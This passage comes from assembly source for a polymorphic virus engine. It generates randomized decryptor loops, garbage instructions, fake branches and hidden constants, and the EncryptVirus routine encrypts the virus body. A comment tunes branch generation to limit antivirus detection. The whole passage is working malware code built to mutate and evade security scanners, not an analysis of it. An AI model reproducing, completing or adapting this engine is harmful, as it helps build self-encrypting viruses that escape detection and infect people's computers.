                            ; ebx is now hidden
        ;***
        Call   Random32
        jp     @GOFORADD
        
        neg    ebx
        mov    cl,byte ptr [ebp + counter_reg]
        Call   GEN_SUB_REG32_IMM
        
        jmp    MakeJMP
   @GOFORADD:

        mov    cl,byte ptr [ebp + counter_reg]
        Call   GEN_ADD_REG32_IMM

      

       MakeJMP:
        Call   Make_Random_Blk;-**-
        
        mov    cl,byte ptr [ebp + counter_reg]
        Call   RestConst 
     @MakeJMP: 
        mov     cl, byte ptr [ebp + counter_reg]
        mov     eax, dword ptr [ebp + LoopOFS]
        mov     dword ptr [ebp + MulFactor], 1
        CALL    MakePolyJMP
        
        
        ;CALL   SHIT_TEST
    
        mov     dword ptr [ebp + CryptorPatch],edi
        
        Call   Make_Random_Blk;-**-
        
        push   8
        pop    eax
        push   12
        pop    ecx
        Call   Get_rand_range 

        mov    ecx,eax
        Call   GarbageBlock
        
        Call   Make_Random_Blk;-**-        
        ret

PolyCryptor endp

CODEGenerated dd 0 ; retrieve the content of this variable immediatly after calling Make_Random_BlkXXXX (in case of Branch destination calculation)

Make_Random_Blk proc uses ecx ebx edx esi 

        push    edi
        
        xor    eax,eax
        push   18                         
        pop    ecx
        Call   Get_rand_range


        .IF    eax     <= 7
               Call    LittleBlk
        .ELSEIF eax    >  7  && eax <= 10
               Call    Push_Pop_blk 
        .ELSEIF eax    == 11
               Call    MediumBlk  
        .ELSEIF eax    >  12 && eax <= 16           ; (trop de détection si ce facteur est trop élevé.)
               Call    Branch_blk
        .ELSEIF eax    == 17
               Call    MemAccess_blk
        .ENDIF

        pop     eax
        sub     eax, edi
        neg     eax
        mov     dword ptr [ebp + CODEGenerated], eax    ; <- put in eax size of code generated
        ret
Make_Random_Blk endp

TrashOrBlk  proc
        Call    Random32
        and     eax, 07h            ; 1 / 7 this can be trash
        dec     eax
        jnz     RandBlk
        Call    Random32
        and     eax, 7Fh
        inc     eax
        push    edi
        Call    GenTrashBlk
        pop     eax
        sub     eax, edi
        neg     eax
        mov     dword ptr [ebp + CODEGenerated], eax    ; <- put in eax size of code generated
        ret
       RandBlk:
        Call    Make_Random_Blk
        ret
TrashOrBlk  endp

Make_Random_Blk_no_0_disp proc

       BadGen:
        push    edi
        Call    Make_Random_Blk
        pop     eax
        sub     eax, edi
        or      eax, eax
        jz      BadGen              ; we don't want zero disp

        ret
Make_Random_Blk_no_0_disp endp

;/BRANCH
BranchMaxRecurs db 0

pBranchBuf      equ ESI

Branch_blk proc uses esi 

       Call     LittleBlk
       
       inc      byte ptr [ebp + BranchMaxRecurs]
       cmp      byte ptr [ebp + BranchMaxRecurs], 6
       jae      ExitBranch
       

        
       sub    esp, 20
       mov    esi, esp
       
       push   PAGE_EXECUTE_READWRITE
       push   MEM_RESERVE or MEM_COMMIT
       push   MAX_BRANCH_CODE_SIZE
       push   0
       lea    eax, dword ptr [ebp + szVirtualAlloc]
       Call   K32Api
       mov    dword ptr [pBranchBuf],eax
       
       push   eax
       xor    eax,eax
       push   5                         
       pop    ecx
       Call   Get_rand_range
       mov    ecx, eax
       or     ecx, ecx
       pop    eax

       jz     @Branch1
       dec    ecx
       jz     @Branch2

      @JmpOver:
       Call   RandomJMPOver
       jmp    @F
       
      @Branch1:
       Call   BranchMethod1
       jmp    @F
      @Branch2:
       Call   BranchMethod2
      @@:
      
       push   MEM_DECOMMIT or MEM_RELEASE	
       push   MAX_BRANCH_CODE_SIZE                        
       push   dword ptr [pBranchBuf]
       lea    eax, dword ptr [ebp + szVirtualFree]
       Call   K32Api

       add    esp, 20
       
       and      byte ptr [ebp + BranchMaxRecurs], 0
      ExitBranch:
       Call     LittleBlk
       ret
Branch_blk endp

UniversalCALL proc
       Call   GEN_CALL_OFS
       ret
UniversalCALL endp

SizeOfJMP   dd 0                ; retrieve the content of this variable immediatly after calling UniversalJMP

UniversalJMP proc
       push   edi
       Call   GEN_JMP_OFS
       pop    eax
       sub    eax, edi
       neg    eax
       mov    dword ptr [ebp + SizeOfJMP], eax
       ret
UniversalJMP endp

JMPSHORT equ 0
JMPLONG  equ 1

BranchOFFSET1       equ     esi
BranchOFFSET2       equ     esi+4
BranchOFFSET3       equ     esi+8
AdjustBranch1       equ     esi+12
AdjustBranch2       equ     esi+16
SizeGenerated2      equ     esi+20
SizeGenerated3      equ     esi+24
_pBranchBuf         equ     esi+28




JMP_TABLE       dd  OFFSET GEN_JNZ_OFS
                dd  OFFSET GEN_JZ_OFS   
                dd  OFFSET GEN_JNZ_OFS
                dd  OFFSET GEN_JZ_OFS  
                dd  OFFSET GEN_JNZ_OFS
                dd  OFFSET GEN_JZ_OFS 
                dd  OFFSET GEN_JNZ_OFS
                dd  OFFSET GEN_JZ_OFS
TOTALJZ_JNZ     = (OFFSET $ - OFFSET JMP_TABLE) / 4                    
                dd  OFFSET GEN_JNS_OFS
                dd  OFFSET GEN_JS_OFS
                dd  OFFSET GEN_JG_OFS
                dd  OFFSET GEN_JL_OFS
                dd  OFFSET GEN_JGE_OFS
                dd  OFFSET GEN_JLE_OFS
                dd  OFFSET GEN_JBE_OFS
                dd  OFFSET GEN_JA_OFS
                dd  OFFSET GEN_JNB_OFS
                dd  OFFSET GEN_JP_OFS
                dd  OFFSET GEN_JNP_OFS

TOTALJMP        = (OFFSET $ - OFFSET JMP_TABLE) / 4 

RandomJMPOver proc uses ecx esi
       sub    esp, 60
       mov    esi, esp
       mov    dword ptr [_pBranchBuf], eax
       and    dword ptr [BranchOFFSET1],0 ; unconditional jmp flag
       and    dword ptr [BranchOFFSET2],0 ; jz/jnz temp flag
       
       push   dword ptr [ebp + CMP_Range]
       
       xor    eax,eax
       push   5                         
       pop    ecx
       Call   Get_rand_range

       or     eax, eax
       jz     LooksLikeDecryptor
       dec    eax
       jz     Random
       dec    eax
       jz     SkipDirectCMP

       
   SimpleJMP:
       inc    dword ptr [BranchOFFSET1]
       jmp    SkipDirectCMP
       
   Random:

       Call   Random32
       push   eax
       Call   Random32
       and    eax, 07h
       dec    eax
       pop    eax
       jnz    @F
       sub    eax, eax
      @@:
       mov    dword ptr [ebp + CMP_Range], eax
       Call   Get2RandRegs

       Call   Random32
       jp     @@RandRegs

       Call   Get2RandRegs
       
       Call   GEN_CMP_REG32_REG32
       
       jmp    SkipDirectCMP
       
LooksLikeDecryptor:

        Call   Random32
        and    eax, 7Fh
        mov    dword ptr [ebp + CMP_Range], eax
        Call   Get2RandRegs
        mov    cl, ch
        
      @@RandRegs:
        
        push   ecx
        xor    eax,eax
        push   5
        pop    ecx
        Call   Get_rand_range 
        pop    ecx
      
        or     eax,eax
        jz     @GEN_CMP_REG32_IMM
        dec    eax
        jz     @GEN_TEST_REG32_REG32
        dec    eax
        jz     @GEN_TEST_REG32_IMM32
        dec    eax
        jz     @GEN_OR_REG32_REG32    
  
        jmp    SkipDirectCMP
@GEN_CMP_REG32_IMM:
        Call   Random32
        mov    cl, al
        and    cl, 7
        push   ecx
        xor    eax,eax
        mov    ecx, dword ptr [ebp + CMP_Range]
        jecxz     @F
        Call   Get_rand_range 
       @@:
        
        mov    ebx,eax
        pop    ecx
        Call   GEN_CMP_REG32_IMM
        jmp    SkipDirectCMP
        
@GEN_TEST_REG32_REG32:
        CAll   GEN_TEST_REG32_REG32
        jmp    SkipDirectCMP
        
@GEN_TEST_REG32_IMM32:
        Call   Random32
        mov    cl, al
        and    cl, 7
        Call   Random32
        mov    ebx, eax
        Call   ArrangeTo8Bits?
        Call   ArrangeTo8Bits?
        Call   ArrangeTo8Bits?
        inc    dword ptr [BranchOFFSET2]
        Call   GEN_TEST_REG32_IMM32
        jmp    SkipDirectCMP 
          
@GEN_OR_REG32_REG32:
        Call   Get2RandRegs
        Call   GEN_OR_REG32_REG32
SkipDirectCMP:

       push   edi
       mov    edi, dword ptr [_pBranchBuf]
       
       Call   Make_Random_Blk_no_0_disp
       mov    ebx, dword ptr [ebp + CODEGenerated]

       pop    edi
       push   ebx
       ;Call   UniversalJMP


       xor    eax,eax
       .IF    dword ptr [BranchOFFSET2] == 0
              push   TOTALJMP
       .ELSE
              push   TOTALJZ_JNZ                ; for test reg32, XXXXXXXX
       .ENDIF
       pop    ecx
       Call   Get_rand_range 

       lea    ecx,dword ptr [ebp + JMP_TABLE]
       mov    eax,dword ptr [ecx + (eax * 4)]
       add    eax,ebp  

       push   edi
       .IF    dword ptr [BranchOFFSET1] == 0
              Call   eax
       .ELSE
              Call   GEN_JMP_OFS
       .ENDIF
       
       pop    eax
       sub    eax, edi
       neg    eax
       mov    dword ptr [ebp + SizeOfJMP], eax


       pop    ebx


       mov    eax, dword ptr [ebp + SizeOfJMP]

       mov    ecx, edi
       
       .IF    eax <= 4          ; short
              dec    ecx
       .ELSE
              sub    ecx, 4
       .ENDIF

       mov    eax, ecx
       .IF    ecx >= 80h && ecx < -80h 
              mov    dword ptr [eax], ebx           ; Ajdust JMP
       .ELSE
              mov    byte ptr [eax], bl
       .ENDIF      
       mov    ecx, ebx
       mov    esi, dword ptr [_pBranchBuf]
       rep    movsb
       
       pop    dword ptr [ebp + CMP_Range]
       
       add    esp, 60
       ret
RandomJMPOver endp

BranchMethod1 proc uses ecx esi
              ;in : eax = branch offset 
              
       sub    esp, 60
       mov    esi, esp
       mov    dword ptr [_pBranchBuf], eax      ; save branch buf offset
       
       Call   UniversalCALL                     ; Create Call
       mov    eax, edi
       sub    eax, 4
       mov    dword ptr [AdjustBranch1], eax    

       Call   Make_Random_Blk
       mov    ebx, eax;dword ptr [ebp + CODEGenerated]
       
       push   edi
       mov    edi, dword ptr [_pBranchBuf]
       Call   TrashOrBlk

       ;mov    eax, dword ptr [ebp + CODEGenerated]
       mov    dword ptr [SizeGenerated2], eax
      
       add    ebx, eax
       
       
       Call   Make_Random_Blk_no_0_disp
       mov    eax, dword ptr [ebp + CODEGenerated]
       inc    eax                               ; for ret
       add    dword ptr [SizeGenerated2], eax
       mov    al, 0C3h
       stosb
       Call   TrashOrBlk
       ;mov    eax, dword ptr [ebp + CODEGenerated]
       add    dword ptr [SizeGenerated2], eax

       pop    edi
       
        
       push   ebx
       mov    ebx, dword ptr [SizeGenerated2]
       Call   UniversalJMP
       pop    ebx

       add    ebx, dword ptr [ebp + SizeOfJMP]
       mov    eax, dword ptr [AdjustBranch1]
       mov    dword ptr [eax], ebx            ; time to adjust CALL
       
       mov    eax, dword ptr [ebp + SizeOfJMP]

       
       mov    ecx, edi
       
       .IF    eax <= 4          ; short
              dec    ecx
       .ELSE
              sub    ecx, 4
       .ENDIF
       
       ;mov    dword ptr [AdjustBranch2], ecx
       mov    eax, ecx;dword ptr [AdjustBranch2]
       mov    ecx, dword ptr [SizeGenerated2]
       .IF    ecx >= 80h && ecx < -80h 
              mov    dword ptr [eax], ecx           ; Ajdust JMP
       .ELSE
              mov    byte ptr [eax], cl
       .ENDIF       


       mov    esi, dword ptr [_pBranchBuf]
       rep    movsb


       add    esp, 60
       ret
BranchMethod1 endp

BranchMethod2 proc uses ecx esi
              ;in : eax = branch offset 
              
       sub    esp, 60
       mov    esi, esp
       mov    dword ptr [_pBranchBuf], eax      ; save branch buf offset

       push   edi
       mov    edi, eax
       push   edi;;

       Call   TrashOrBlk
       
       ;mov    eax, dword ptr [ebp + CODEGenerated]
       mov    dword ptr [BranchOFFSET1], eax     ; for call, will be adjusted later...
       
       mov    dword ptr [SizeGenerated2], eax

       Call   Make_Random_Blk_no_0_disp

       mov    eax, dword ptr [ebp + CODEGenerated]
       inc    eax                                   ; for ret
       add    dword ptr [SizeGenerated2], eax
       mov    al, 0C3h
       stosb

       Call   TrashOrBlk
       ;mov    eax, dword ptr [ebp + CODEGenerated]
       add    dword ptr [SizeGenerated2], eax
       Call   Make_Random_Blk
       mov    eax, dword ptr [SizeGenerated2]
       add    eax, dword ptr [ebp + CODEGenerated]
       add    eax, 5
       mov    dword ptr [SizeGenerated3], eax
       Call   UniversalCALL                     ; Create Call
       mov    eax, edi
       sub    eax, 4
       pop    ecx;;
       sub    ecx, edi
       add    ecx, dword ptr [BranchOFFSET1]
       mov    dword ptr [eax], ecx              ; adjust call offset
       
       pop    edi


       mov    ebx, dword ptr [SizeGenerated2]
       Call   UniversalJMP

       
       mov    eax, dword ptr [ebp + SizeOfJMP]

       mov    ecx, edi
       
       .IF    eax <= 4          ; short
              dec    ecx
       .ELSE
              sub    ecx, 4
       .ENDIF

       ;mov    dword ptr [AdjustBranch2], ecx
       mov    eax, ecx; dword ptr [AdjustBranch2]
       mov    ecx, dword ptr [SizeGenerated2]
       .IF    ecx >= 80h && ecx < -80h 
              mov    dword ptr [eax], ecx           ; Ajdust JMP
       .ELSE
              mov    byte ptr [eax], cl
       .ENDIF       

       mov    ecx, dword ptr [SizeGenerated3]
       mov    esi, dword ptr [_pBranchBuf]
       rep    movsb
       
       add    esp, 60
       ret
BranchMethod2 endp

BranchMethod3 proc
       sub    esp, 60
       mov    esi, esp
       mov    dword ptr [_pBranchBuf], eax      ; save branch buf offset
       push   edi
       mov    edi, eax
       Call   Make_Random_Blk
       ;mov    eax, dword ptr [ebp + CODEGenerated]
       mov    dword ptr [BranchOFFSET1], eax
       
       pop    edi
       
       add    esp, 60
       ret
BranchMethod3 endp


WhereToJmp  dd  0
;UseDec db 0

_LoopOFS equ esi
MakePolyJMP proc     uses esi edx ecx ebx; in : ecx ctr_reg


        sub    esp, 10
        mov    esi, esp
        mov    dword ptr [_LoopOFS], eax
        
        push   ecx
        xor    eax,eax
        push   4
        pop    ecx
        Call   Get_rand_range 
        pop    ecx
        
        mov    ch, cl


        
        or     eax,eax
        jz     @GEN_CMP_REG32_IMM
        dec    eax
        jz     @GEN_TEST_REG32_REG32
        dec    eax
        jz     @GEN_OR_REG32_REG32    
        
        jmp    SkipDirectCMP
@GEN_CMP_REG32_IMM:
        push   ecx
        Call   Make_Random_Blk;-**-
        xor    eax,eax
        mov    ecx, dword ptr [ebp + CMP_Range]
        jecxz  @F
        Call   Get_rand_range 
       @@:
        
        mov    ebx,eax
        pop    ecx
        Call   GEN_CMP_REG32_IMM
        jmp    SkipDirectCMP
        
@GEN_TEST_REG32_REG32:
        Call   Make_Random_Blk;-**-
        CAll   GEN_TEST_REG32_REG32
        jmp    SkipDirectCMP
        
@GEN_OR_REG32_REG32:
        Call    Make_Random_Blk;-**-
        Call    GEN_OR_REG32_REG32
SkipDirectCMP:

                    
        Call   Random32             ; Get method
        jp     @Method1
        Call   Random32             ; Get method
        jp     @JmpLong
        xor    ebx, ebx            ; setup relative jmp short
        jmp    @Method2
       @JmpLong:   
        mov    ebx, edi            ; setup relative jmp long
        jmp    @Method2
      @Method1:
        mov    ebx,dword ptr [_LoopOFS]
        sub    ebx,edi   ; adresse où sauter   
        
       
        xor    eax,eax

        .IF    dword ptr [ebp + MulFactor] == 1
               push   4
        .ELSE
               push   3
        .ENDIF
        pop    ecx
        Call   Get_rand_range 

        or     eax,eax
        jz     @GEN_JNS_OFS
        dec    eax
        jz     @GEN_JG_OFS
        dec    eax
        jz     @GEN_JGE_OFS
        
        Call   GEN_JNZ_OFS
        jmp    ExitJmp
      @GEN_JNS_OFS: 
        CALL   GEN_JNS_OFS
        jmp    ExitJmp
      @GEN_JG_OFS:
        CALL   GEN_JG_OFS
        jmp    ExitJmp
      @GEN_JGE_OFS:
        CALL   GEN_JGE_OFS

        
       ExitJmp:
        jmp ExitFinal
        
       @Method2: 
        ;---
        xor    eax,eax
        
        .IF    dword ptr [ebp + MulFactor] == 1
               push   4
        .ELSE
               push   3
        .ENDIF
        pop    ecx
        Call   Get_rand_range 
        
 
        
        
        or     eax,eax
        jz     @GEN_JS_OFS
        dec    eax
        jz     @GEN_JL_OFS
        dec    eax
        jz     @GEN_JLE_OFS

        
        Call   GEN_JZ_OFS
        jmp    ExitJmp2
      @GEN_JS_OFS: 
        CALL   GEN_JS_OFS
        jmp    ExitJmp2
      @GEN_JL_OFS:
        CALL   GEN_JL_OFS
        jmp    ExitJmp2
      @GEN_JLE_OFS:
        CALL   GEN_JLE_OFS
      ExitJmp2:


        
        mov    eax, edi
        .IF    byte ptr [ebp + JmpShort?] == 1
               dec    eax
        .ELSE
               sub    eax, 4
        .ENDIF


        mov    dword ptr [ebp + WhereToJmp], eax

        .IF    byte ptr [ebp + JmpShort?] == 0
        


               mov    ebx, edi
               mov    edx, edi
              Encore:
               mov    ebx, edx
               Call   Make_Random_Blk   ; jmp long
               sub    ebx, edi
               neg    ebx
               Call   IS_NBR_8B
               jnc    Encore            ; not enough disp

               push   ebx
               mov    edx, edi
               mov    ebx,dword ptr [_LoopOFS]
               sub    ebx,edi   ; adresse où sauter 
               CALL   GEN_JMP_OFS
               sub    edx, edi
               neg    edx 
               pop    ebx
               add    ebx, edx

               push   ebx
               mov    edx, edi
               Call   Make_Random_Blk
               sub    edx, edi
               neg    edx 
               pop    ebx
               add    ebx, edx

               Call   Random32
               and    eax, 7
               jnz    @Notrash
               xor    eax,eax
               inc    eax
               push   100
               pop    ecx
               Call   Get_rand_range 
               add    ebx, eax
               Call   GenTrashBlk
              @Notrash:
                      
               mov     eax, dword ptr [ebp + WhereToJmp]
               mov     dword ptr [eax], ebx

        .ELSE

               mov    ebx, edi
               Call   LittleBlk         ; little block for short disp...
               sub    ebx, edi
               neg    ebx

               
               push   ebx
               mov    edx, edi
               mov    ebx,dword ptr [_LoopOFS]
               sub    ebx,edi
               CALL   GEN_JMP_OFS
               sub    edx, edi
               neg    edx 
               pop    ebx
               add    ebx, edx
               
               push   ebx
               mov    edx, edi
               Call   LittleBlk         ; 
               sub    edx, edi
               neg    edx 
               pop    ebx
               add    ebx, edx

               Call   Random32
               and    eax, 7
               jnz    @Notrash2
               xor    eax,eax
               inc    eax
               push   20
               pop    ecx
               Call   Get_rand_range 
               add    ebx, eax
               Call   GenTrashBlk
              @Notrash2:
              
               mov     eax, dword ptr [ebp + WhereToJmp]
               mov     byte ptr [eax], bl
               
        .ENDIF 



     ExitFinal:   
        add    esp, 10
        ret

MakePolyJMP endp


GenTrashBlk    proc uses ecx

        xchg    eax, ecx
       @@:
        Call    Random32
        stosb
        dec     ecx
        jnz     @B
        ret 
        
GenTrashBlk    endp

        
EncryptVirus proc

        
        
        push   edi
        
        and    dword ptr [ebp + PolyErrFlag],0
        
        mov    edi,eax

        mov    esi, dword ptr [ebp + What2encrypt]
        mov    ecx, dword ptr [ebp + SizeOfWhat2encrypt]
        shr    ecx, 2
        inc    ecx
        rep    movsd


        mov     ebx, dword ptr [ebp + PolyBuf]
        sub     ebx, OFFSET VirusStart
        add     ebx,dword ptr [ebp + PolySize]       ; get MEM delta
        mov     eax,dword ptr [ebp + BaseOFS]
        add     dword ptr [eax],ebx                  ; Adjust Delta
        
        mov      ecx,0C3C3C3C3h                      ; ret


        mov      esi,dword ptr [ebp + CryptorPatch]
        xchg     ecx,dword ptr [esi]                 ; DWORD TO PATCH


         

       Call    Save_regs                             ;

       lea     eax,[poly_handler+ebp]                ; Setup SEH frame for poly error handling
       push    eax        
       mov     dword ptr [ebp + @@@@Delta],ebp       ; Save Delta 
       mov     dword ptr [ebp + @@StackPtr],esp      ; Save Stack
       xor     edx,edx                         
       push    dword ptr fs:[edx]            
       mov     dword ptr fs:[edx],esp

       
       mov    eax,dword ptr [ebp + PolyBuf]
       add    eax,dword ptr [ebp + PolySize] 
       mov    eax,dword ptr [eax+4]               
       mov    dword ptr [ebp + VirCODE],eax          ; Portion of virus code (PolyErrFlag)
              

            ;int 3; *-*-*

        Call     dword ptr [ebp + PolyBuf] 



     poly_handler:
        cld      ; <- clear direction flag (possible "std" executed in poly code)

        
         DB      0BCh
      @@StackPtr   dd      00000000h                 ; Restore Stack
      
        xor     edx,edx    
        pop     dword ptr fs:[edx] 

        
  
        db      0BDh
      @@@@Delta dd 00000000h                         ; Restore Delta


        push   eax
        
        mov    eax,dword ptr [ebp + PolyBuf]
        add    eax,dword ptr [ebp + PolySize]                
        mov    edx,dword ptr [ebp + VirCODE]
        mov    eax,dword ptr [eax+4]                 ; Encryption check in case of error
        cmp    edx,eax
        jnz    @F

        inc     dword ptr [ebp + PolyErrFlag]        ; IF edx == eax then virus is not properly encrypted

        @@:
        
        pop    eax
        
        Call     Restore_regs 
        
        xchg     ecx,dword ptr [esi];;
        sub      dword ptr [eax],ebx
        mov      ebx,dword ptr [ebp + @Delta]
        add      dword ptr [eax],ebx                 ; ReAjust Offset
            
        pop      edi
        



        
        ret
        
EncryptVirus endp




                  


ConstHider        dd    0
                  dd    0
                  dd    0
                  dd    0
                  
HideCtr           dd    0
HideMaxCtr        dd    0

    ; In ebx = const to hide
          
HideConst      proc uses ecx edx

        push   edi
        lea    edi, [ebp + RestoreTBL]
        xor    eax, eax
        mov    ecx, 4
        rep    stosd
        pop    edi
        and    dword ptr [ ebp + HideCtr], 0
        xor    eax,eax
        inc    eax
        push   4
        pop    ecx
        Call   Get_rand_range 
        mov    dword ptr [ ebp + HideMaxCtr], eax
        
       HideLp:
        mov    edx, dword ptr [ ebp + HideCtr]
        
        Call   Random32
        mov    dword ptr [ebp + edx*4 + ConstHider], eax        

        push   ecx
        xor    eax,eax
        push   2
        pop    ecx
        Call   Get_rand_range 
        pop    ecx
        
        or     eax,eax
        jz     HIDE_SUB

        dec    eax
        jz     HIDE_ADD


        
     HIDE_SUB:
        sub    ebx,dword ptr [ebp + edx*4 + ConstHider]
        mov    eax, OFFSET GEN_ADD_REG32_IMM
        jmp    @F
     HIDE_ADD:
        add    ebx,dword ptr [ebp + edx*4 + ConstHider]
        mov    eax, OFFSET GEN_SUB_REG32_IMM
       @@:
        mov    dword ptr [ebp + edx * 4 + RestoreTBL], eax
        inc    dword ptr [ ebp + HideCtr]
        mov    eax, dword ptr [ ebp + HideMaxCtr]
        cmp    eax, dword ptr [ ebp + HideCtr]
        jnz    HideLp
        ret

HideConst      endp


RestoreTBL        dd 0  
                  dd 0  
                  dd 0
                  dd 0
                  
                  dd 0

        ; in: cl = reg with hidden const to restore
        
RestConst      proc uses edx esi

        push   ebx
        push   ecx
        
        xor    eax, eax
       RestLp:
       
        lea    edx,dword ptr [ebp + RestoreTBL]
        mov    esi,dword ptr [edx + (eax * 4)]
        or     esi, esi                                 ; Are we finished
        jz     OutLp
        add    esi,ebp

        mov    ebx,dword ptr [ebp + eax*4+ ConstHider]
        push   eax
        push   esi
        Call   Make_Random_Blk
        pop    esi
        Call   esi
        pop    eax
        inc    eax
        jmp    RestLp
        
       OutLp:
        pop    ecx
        pop    ebx

        ret
RestConst      endp


;ReturnAddr       dd 0
VirCODE          dd 0
PolyErrFlag      dd 0



        MediumBlk   proc uses ebx
        ;-----------------------------------------
        push   edx
        push   ecx
        xor    eax, eax
        push   10               
        pop    ecx
        Call   Get_rand_range 
        or     eax,eax
        jz     @F
        mov    ecx,eax
        Call   GarbageBlock
       @@:
        pop    ecx
        pop    edx
        ;-----------------------------------------
        ret
        MediumBlk   endp


        
        LittleBlk proc uses ebx
        ;-----------------------------------------
        push   edx
        push   ecx
        xor    eax,eax
        push   5                
        pop    ecx
        Call   Get_rand_range 
        or     eax,eax
        jz     @F
        mov    ecx,eax
        Call   GarbageBlock
       @@:
        pop    ecx
        pop    edx
        ;-----------------------------------------
        ret
        LittleBlk   endp



GarbageBlock    proc

       @@:
        push    ecx
        Call    Garbage
        pop     ecx
        dec     ecx
        jnz     @B
        
        ret
GarbageBlock    endp


Garbage:
        
        
        


        push   ebx

        push   dword ptr [ebp + _MOD]
        push   dword ptr [ebp + _SCALE]
        push   dword ptr [ebp + Displacement]
                
        Call   Random32
        mov    ebx,eax
        Call   ArrangeTo8Bits?
                     
        xor    eax,eax

        .IF    byte ptr [ebp + _garb1_reserved] == 0 ; ?
               push   TOTALNBR
        .ELSE
               push   TOTALNBR - 2                      ; Pas de xchg, xadd ect...
        .ENDIF

        pop    ecx
        Call   Get_rand_range  

        
        lea    ecx,dword ptr [ebp + InstrTBL]
        mov    edx,dword ptr [ecx + (eax * 4)]
        
        add    edx,ebp  
        


        .IF     eax >= TOTALNBR - 2       ; init regs ...
        
                Call   Get2ValidAuxRegs   ; source reg IS modified (for XCHG, XADD)
                
        .ELSEIF    eax >= MEMSTARTNBR     ; for MEM operations
                Call   Get2ValidAuxRegs   ; for XCHG, XADD, LEA
                push   ecx
                

                xor    eax, eax
                push   3
                pop    ecx
                Call   Get_rand_range         
                mov    byte ptr [ebp + _MOD], al
                
                Call   Get2ValidAuxRegs
                mov    byte ptr [ebp + _REG_OPCODE], cl
                Call   Random32
                and    al, 7
                mov    byte ptr [ebp + _RM],al
        
                xor    eax, eax
                push   4
                pop    ecx
                Call   Get_rand_range    
        
        
                
                mov    byte ptr [ebp + _SCALE], al
                Call   Random32
                and    al, 7
                mov    byte ptr [ebp + _INDEX], al
                ;Call   Get2RandRegs
                Call   Random32
                and    al, 7
                mov    byte ptr [ebp + _BASE], al
                
                
                .IF    dword ptr [ebp + _MOD] == 0 && dword ptr [ebp + _RM] == 5
                Call   Random32
                jp     @F
                
                .ENDIF

                Call   GetRandomDataOFS
               @@:

                pop    ecx

                mov    dword ptr [ebp + Displacement], ebx
        .ELSE
                Call   Get2RandRegs

        .ENDIF
        Call   Rand_Prefix
        Call   Rand_OneByte
        Call   edx                                               ; Generate it !
        pop   dword ptr [ebp + Displacement]
        pop   dword ptr [ebp + _SCALE]
        pop   dword ptr [ebp + _MOD]
 
        pop    ebx
        ret
        


EnableAllRegsUse  db 0

;/MEM

MemAccess_blk proc uses ebx edx 

        cmp    byte ptr [ebp + EnableAllRegsUse], 1 ;!-!
        jb     @F
        xor    eax, eax     ; Exit Error
        ret
       @@:
        inc    byte ptr [ebp + EnableAllRegsUse]
        ;int 3
        
        push   dword ptr [ebp + base_reg]
        push   dword ptr [ebp + base_reg+4]
        mov    al, 60h          ; save regs
        stosb

        Call   GetRegs
        
        Call   Get2RandRegs
        mov    byte ptr [ebp + _INDEX], ch
        mov    byte ptr [ebp + garb_reg1], ch  
                      
        Call   Get2RandRegs
        mov    byte ptr [ebp + _BASE], ch
        mov    byte ptr [ebp + garb_reg2], ch
                
        Call   Get2RandRegs
        mov    byte ptr [ebp + _REG_OPCODE], ch
        mov    byte ptr [ebp + garb_reg3], ch
        

        Call   Make_Random_Blk_no_0_disp

        mov    al, 61h          ; restore regs
        stosb

        pop   dword ptr [ebp + base_reg+4]
        pop   dword ptr [ebp + base_reg]
        
        xor    eax, eax
        inc    eax          ; ExitOk
        and    byte ptr [ebp + EnableAllRegsUse], 0
        ret
MemAccess_blk endp


Get2ValidAuxRegs proc 


        xor    eax,eax


        .IF    byte ptr [ebp + _garb1_reserved]     !=   0     ; Reserved for memory access ?
               inc   eax
        .ENDIF

        .IF    byte ptr [ebp + _garb2_reserved]     !=   0     ; Reserved for memory access ?
               inc   eax
               .IF    EAX == 2                                 ; 2 garbage regs used ?
                      movzx  ecx, byte ptr [ebp + garb_reg3]
                      jmp    @F
               .ENDIF
        .ENDIF
        
        push   3                           
        pop    ecx
        Call   Get_rand_range  
          

        movzx  ecx,byte ptr [eax + ebp + garb_reg1]
       @@: 
        
        xor    eax,eax
        .IF    byte ptr [ebp + _garb1_reserved] != 0
               inc  eax
        .ENDIF    
        push   ecx
        push   3                          
        pop    ecx
        Call   Get_rand_range  
        pop    ecx
   
        mov    ch,byte ptr [eax + ebp + garb_reg1]


        ret
Get2ValidAuxRegs endp

Get2RandRegs proc  


       
        xor    eax,eax

        .IF    byte ptr [ebp + _garb1_reserved]     !=   0     ; Reserved for memory access ?
               inc   eax
        .ENDIF

        .IF    byte ptr [ebp + _garb2_reserved]     !=   0     ; Reserved for memory access ?
               inc   eax
               .IF    EAX == 2                                 ; 2 garbage regs used ?
                      movzx  ecx, byte ptr [ebp + garb_reg3]
                      jmp    @F
               .ENDIF
        .ENDIF
        
        push   3                           
        pop    ecx
        Call   Get_rand_range  
          
        movzx  ecx,byte ptr [eax + ebp + garb_reg1]
        
       @@:
        push   ecx
        xor    eax,eax
        push   7                           
        pop    ecx
        Call   Get_rand_range  
        pop    ecx
        mov    ch,byte ptr [eax + ebp + base_reg]

        ret

;Add_Flag db 0
Get2RandRegs endp

GetValid8BREGS proc

        push   edx
        Call   @GetValid8BREGS
        jc     @F
        pop    edx
        clc
        ret
        
       @@:
        pop   edx
        stc
        
        ret
GetValid8BREGS endp

@GetValid8BREGS proc 

        ;And   byte ptr [ebp + Add_Flag],0

        mov   edx,5
        
      Relp:
        push  edx
        Call  Get2ValidAuxRegs
        pop   edx
        mov   al,cl
        cmp   al,3
        jna   @F
        sub   al,4

       @@:
        
        Call  IS_GARB_REG
        jnc   @F
        clc
        
        ret
       @@:
        dec   edx
        jnz   Relp
        stc
        ret
@GetValid8BREGS endp

IS_GARB_REG proc
        
        CMP   byte ptr [ebp + garb_reg1], al
        jz    @F
        CMP   byte ptr [ebp + garb_reg2], al
        jz    @F   
        CMP   byte ptr [ebp + garb_reg3], al
        jz    @F
       @No8BGarb:
        clc 
        ret
            
       @@:

        CMP   word ptr [ebp + _garb1_reserved],0 ; Are regs reserved  ?
        JZ    @F                                 ; ok proceed
        cmp   byte ptr [ebp + garb_reg3], al     
        jnz   @No8BGarb                          ; Skip if not garb3
       @@:

 

        
      @RegOk:
                      
        .IF   al < 4

            mov   dl,al
            CAll  Random32
            jp    @F
            add   dl,4
           @@:

        .ENDIF
        
        mov   cl,dl

        Call   Random32
        and    eax,7
        mov    ch,al
        
        stc
        ret
IS_GARB_REG endp

WaitLoop_Blk    proc uses ebx edx ecx

        cmp    byte ptr [ebp + _garb1_reserved],0
        jz     @F
        ret
       @@:
        inc    byte ptr [ebp + _garb1_reserved] 

        Call   Random32
        mov    ebx, eax
        and    ebx, 7
        
        mov    eax, 300000                ;large range
        mov    ecx, 1000000
